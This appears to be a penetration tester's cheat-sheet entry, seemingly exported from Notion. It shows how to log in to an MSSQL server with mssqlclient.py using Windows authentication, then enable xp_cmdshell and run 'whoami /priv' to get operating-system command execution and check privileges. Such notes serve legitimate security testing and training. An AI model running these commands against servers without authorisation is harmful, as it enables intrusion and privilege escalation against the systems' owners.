# mssqlclient.py <user>@<FQDN/IP> -windows-auth

OS: Linux
Description: Log in to the MSSQL server using Windows authentication.
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21)

### MSSQL

```jsx
mssqlclient.py TargetDomain/DAMUNDSEN@172.16.5.150 -windows-auth
enable_xp_cmdshell
xp_cmdshell whoami /priv
```